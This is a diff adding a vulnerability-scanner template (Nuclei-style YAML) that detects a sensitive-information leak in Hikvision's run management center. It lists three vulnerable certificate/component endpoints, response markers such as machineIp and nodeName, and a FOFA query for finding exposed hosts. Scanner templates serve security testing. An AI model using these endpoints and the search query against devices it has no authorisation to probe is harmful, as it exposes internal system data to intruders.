@@ -1,0 +1,35 @@
+id: hikvision-run-manager-machine-component-disclosure
+info:
+  name: 海康威视运行管理中心 bic component - 敏感信息泄露
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="<h1>Welcome to OpenResty!</h1>" && icon_hash="-808437027"
+  tags: hikvision,disclosure
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/bic/caService/v1/certificate/machine/component"
+      - "{{BaseURL}}/hk/bic/caService/v1/certificate/machine/component"
+      - "{{BaseURL}}/hikvision/bic/caService/v1/certificate/machine/component"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "machineIp"
+          - "nodeName"
+          - "serviceNodeId"
+        condition: and
+
+      - type: status
+        status:
+          - 200
